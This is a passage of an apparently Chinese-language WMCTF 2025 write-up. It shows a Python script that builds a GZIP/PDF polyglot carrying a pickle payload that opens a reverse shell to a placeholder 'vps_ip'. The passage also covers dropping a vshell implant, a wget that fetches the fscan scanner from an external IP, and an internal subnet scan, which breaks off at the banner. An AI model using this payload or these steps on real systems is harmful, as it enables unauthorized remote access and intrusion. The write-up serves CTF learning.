</span></span><span class="line"><span class="cl">            <span class="o">+</span> <span class="sa">f</span><span class="s2">&#34;/Size </span><span class="si">{</span><span class="n">max_obj</span> <span class="o">+</span> <span class="mi">1</span><span class="si">}</span><span class="s2"> &#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;ascii&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;/Root 1 0 R &#34;</span>
</span></span><span class="line"><span class="cl">            <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;&gt;&gt;</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">w</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;startxref</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">w</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">startxref</span><span class="si">}</span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;ascii&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">w</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="si">%%</span><span class="s2">EOF</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">bio</span><span class="o">.</span><span class="n">getvalue</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">out_dir</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="vm">__file__</span><span class="p">),</span> <span class="n">os</span><span class="o">.</span><span class="n">pardir</span><span class="p">,</span> <span class="s2">&#34;samples&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">out_dir</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">out_dir</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">out_dir</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">out_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">out_dir</span><span class="p">,</span> <span class="s2">&#34;debug_ops.pdf&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">build_pdf_bytes</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">out_path</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;PDF written:&#34;</span><span class="p">,</span> <span class="n">out_path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Size:&#34;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="s2">&#34;bytes&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">out_path</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>生成恶意PDF</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">zlib</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">build_minimal_pdf</span><span class="p">(</span><span class="n">base_offset</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Build a minimal valid PDF with absolute xref offsets accounting for base_offset</span>
</span></span><span class="line"><span class="cl">    <span class="n">header</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;%PDF-1.4</span><span class="se">\n</span><span class="s2">%</span><span class="se">\xE2\xE3\xCF\xD3\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">obj1</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;&#34;1 0 obj
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;&lt; /Type /Catalog /Pages 2 0 R &gt;&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">endobj
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">obj2</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;&#34;2 0 obj
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;&lt; /Type /Pages /Kids [3 0 R] /Count 1 &gt;&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">endobj
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">obj3</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;&#34;3 0 obj
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;&lt; /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R &gt;&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">endobj
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">stream_body</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;Hello WMCTF!&#34;</span>  <span class="c1"># small visible text</span>
</span></span><span class="line"><span class="cl">    <span class="n">obj4</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s2">&#34;4 0 obj</span><span class="se">\n</span><span class="s2">&lt;&lt; /Length </span><span class="si">%d</span><span class="s2"> &gt;&gt;</span><span class="se">\n</span><span class="s2">stream</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">stream_body</span><span class="p">))</span> <span class="o">+</span> <span class="n">stream_body</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">endstream</span><span class="se">\n</span><span class="s2">endobj</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Build PDF body and record absolute offsets</span>
</span></span><span class="line"><span class="cl">    <span class="n">pdf</span> <span class="o">=</span> <span class="n">header</span>
</span></span><span class="line"><span class="cl">    <span class="n">abs_offsets</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">obj</span> <span class="ow">in</span> <span class="p">(</span><span class="n">obj1</span><span class="p">,</span> <span class="n">obj2</span><span class="p">,</span> <span class="n">obj3</span><span class="p">,</span> <span class="n">obj4</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">abs_offsets</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">base_offset</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">pdf</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">pdf</span> <span class="o">+=</span> <span class="n">obj</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># xref and trailer with absolute positions</span>
</span></span><span class="line"><span class="cl">    <span class="n">xref_abs_offset</span> <span class="o">=</span> <span class="n">base_offset</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">pdf</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">xref_lines</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;xref&#34;</span><span class="p">,</span> <span class="s2">&#34;0 5&#34;</span><span class="p">,</span> <span class="s2">&#34;0000000000 65535 f &#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">off</span> <span class="ow">in</span> <span class="n">abs_offsets</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">xref_lines</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">off</span><span class="si">:</span><span class="s2">010d</span><span class="si">}</span><span class="s2"> 00000 n &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">xref</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">xref_lines</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;ascii&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">trailer</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&#34;trailer</span><span class="se">\n</span><span class="s2">&lt;&lt; /Size 5 /Root 1 0 R &gt;&gt;</span><span class="se">\n</span><span class="s2">startxref</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">xref_abs_offset</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="si">%%</span><span class="s2">EOF</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;ascii&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">pdf</span> <span class="o">+</span> <span class="n">xref</span> <span class="o">+</span> <span class="n">trailer</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">build_gzip_with_extra</span><span class="p">(</span><span class="n">extra_bytes</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">payload_bytes</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># GZIP header with FEXTRA holding extra_bytes (uncompressed), then deflate-compressed payload, then CRC/ISIZE</span>
</span></span><span class="line"><span class="cl">    <span class="n">ID1</span><span class="p">,</span> <span class="n">ID2</span><span class="p">,</span> <span class="n">CM</span> <span class="o">=</span> <span class="mh">0x1F</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x08</span>
</span></span><span class="line"><span class="cl">    <span class="n">FLG</span> <span class="o">=</span> <span class="mh">0x04</span>  <span class="c1"># FEXTRA</span>
</span></span><span class="line"><span class="cl">    <span class="n">MTIME</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">XFL</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">OS</span> <span class="o">=</span> <span class="mi">255</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">extra_bytes</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mh">0xFFFF</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;extra_bytes too long for GZIP FEXTRA (max 65535)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">header</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">ID1</span><span class="p">,</span> <span class="n">ID2</span><span class="p">,</span> <span class="n">CM</span><span class="p">,</span> <span class="n">FLG</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">header</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">MTIME</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">header</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">XFL</span><span class="p">,</span> <span class="n">OS</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">header</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;H&#39;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">extra_bytes</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">header</span> <span class="o">+=</span> <span class="n">extra_bytes</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># raw deflate for payload</span>
</span></span><span class="line"><span class="cl">    <span class="n">comp</span> <span class="o">=</span> <span class="n">zlib</span><span class="o">.</span><span class="n">compressobj</span><span class="p">(</span><span class="n">level</span><span class="o">=</span><span class="mi">9</span><span class="p">,</span> <span class="n">wbits</span><span class="o">=-</span><span class="mi">15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">comp_data</span> <span class="o">=</span> <span class="n">comp</span><span class="o">.</span><span class="n">compress</span><span class="p">(</span><span class="n">payload_bytes</span><span class="p">)</span> <span class="o">+</span> <span class="n">comp</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">crc</span> <span class="o">=</span> <span class="n">zlib</span><span class="o">.</span><span class="n">crc32</span><span class="p">(</span><span class="n">payload_bytes</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>
</span></span><span class="line"><span class="cl">    <span class="n">isize</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload_bytes</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">trailer</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;II&#39;</span><span class="p">,</span> <span class="n">crc</span><span class="p">,</span> <span class="n">isize</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">header</span> <span class="o">+</span> <span class="n">comp_data</span> <span class="o">+</span> <span class="n">trailer</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># When storing PDF in GZIP FEXTRA, the PDF starts at byte offset 12 from file start</span>
</span></span><span class="line"><span class="cl">    <span class="n">base_offset</span> <span class="o">=</span> <span class="mi">12</span>  <span class="c1"># 10-byte gzip fixed header + 2-byte XLEN</span>
</span></span><span class="line"><span class="cl">    <span class="n">pdf_bytes</span> <span class="o">=</span> <span class="n">build_minimal_pdf</span><span class="p">(</span><span class="n">base_offset</span><span class="o">=</span><span class="n">base_offset</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># payload to be recovered after decompression</span>
</span></span><span class="line"><span class="cl">    <span class="n">opcode_bytes</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;&#39;(S&#39;python -c </span><span class="se">\&#39;</span><span class="s1">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;vps_ip&#34;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;sh&#34;)</span><span class="se">\&#39;</span><span class="s1">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">ios
</span></span></span><span class="line"><span class="cl"><span class="s1">system
</span></span></span><span class="line"><span class="cl"><span class="s1">.&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">gz_polyglot</span> <span class="o">=</span> <span class="n">build_gzip_with_extra</span><span class="p">(</span><span class="n">extra_bytes</span><span class="o">=</span><span class="n">pdf_bytes</span><span class="p">,</span> <span class="n">payload_bytes</span><span class="o">=</span><span class="n">opcode_bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;opcode.gz&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">gz_polyglot</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Diagnostics</span>
</span></span><span class="line"><span class="cl">    <span class="n">idx</span> <span class="o">=</span> <span class="n">gz_polyglot</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;%PDF-&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;%PDF- found at offset:&#34;</span><span class="p">,</span> <span class="n">idx</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Total size:&#34;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">gz_polyglot</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Quick local checks</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 1) Decompress to verify opcode</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="kn">import</span> <span class="nn">gzip</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">gzip</span><span class="o">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">gz_polyglot</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Decompressed data:&#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Decompress failed:&#34;</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># 2) Basic header preview for PDF</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Header preview around %PDF-:&#34;</span><span class="p">,</span> <span class="n">gz_polyglot</span><span class="p">[</span><span class="n">idx</span><span class="p">:</span><span class="n">idx</span><span class="o">+</span><span class="mi">20</span><span class="p">]</span> <span class="k">if</span> <span class="n">idx</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="k">else</span> <span class="kc">None</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;生成 polyglot: 有效GZIP(可解压得到opcode) + 头部携带有效PDF(可通过PDF解析)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>生成恶意opcode的文件，然后就可以反弹shell了</p>
<h2 id="shopping-company1">Shopping company1
</h2><p>by a5rz &amp;&amp; baozongwi</p>
<p>直接vshell上线</p>
<p><img src="/p/wmctf-2025/1.png"
	width="1769"
	height="465"
	srcset="/p/wmctf-2025/1_hu_f6ae8e4249e862ea.png 480w, /p/wmctf-2025/1_hu_9c7fa3afbd7996f9.png 1024w"
	loading="lazy"
	
		alt="img"
	
	
		class="gallery-image" 
		data-flex-grow="380"
		data-flex-basis="913px"
	
></p>
<h2 id="shopping-company3">Shopping company3
</h2><p>by baozongwi</p>
<p>传个fscan上去，发现有两个网段</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">wget</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">154.36.152.109</span><span class="p">:</span><span class="mi">9999</span><span class="o">/</span><span class="n">fscan</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ifconfig</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>对于172的网段进行扫描，结果如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">root</span><span class="nd">@ff7bf03fb11e</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="c1"># ./fscan -h 172.20.0.20/24</span>
</span></span><span class="line"><span class="cl"><span class="err">┌──────────────────────────────────────────────┐</span>
</span></span><span class="line"><span class="cl"><span class="err">│</span>    <span class="n">___</span>                              <span class="n">_</span>        <span class="err">│</span>
</span></span><span class="line"><span class="cl"><span class="err">│</span>   <span class="o">/</span> <span class="n">_</span> \     <span class="n">___</span>  <span class="n">___</span> <span class="n">_</span> <span class="n">__</span> <span class="n">__</span> <span class="n">_</span>  <span class="n">___</span><span class="o">|</span> <span class="o">|</span> <span class="n">__</span>    <span class="err">│</span>
</span></span><span class="line"><span class="cl"><span class="err">│</span>  <span class="o">/</span> <span class="o">/</span><span class="n">_</span>\<span class="o">/</span><span class="n">____</span><span class="o">/</span> <span class="n">__</span><span class="o">|/</span> <span class="n">__</span><span class="o">|</span> <span class="s1">&#39;__/ _` |/ __| |/ /    │</span>
</span></span><span class="line"><span class="cl"><span class="err">│</span> <span class="o">/</span> <span class="o">/</span><span class="n">_</span>\\<span class="n">_____</span>\<span class="n">__</span> \ <span class="p">(</span><span class="n">__</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="p">(</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="p">(</span><span class="n">__</span><span class="o">|</span>   <span class="o">&lt;</span>     <span class="err">│</span>
</span></span><span class="line"><span class="cl"><span class="err">│</span> \<span class="n">____</span><span class="o">/</span>     <span class="o">|</span><span class="n">___</span><span class="o">/</span>\<span class="n">___</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>  \<span class="n">__</span><span class="p">,</span><span class="n">_</span><span class="o">|</span>\<span class="n">___</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>\<span class="n">_</span>\    <span class="err">│</span>
</span></span><span class="line"><span class="cl"><span class="err">└──────────────────────────────────────────────┘</span>
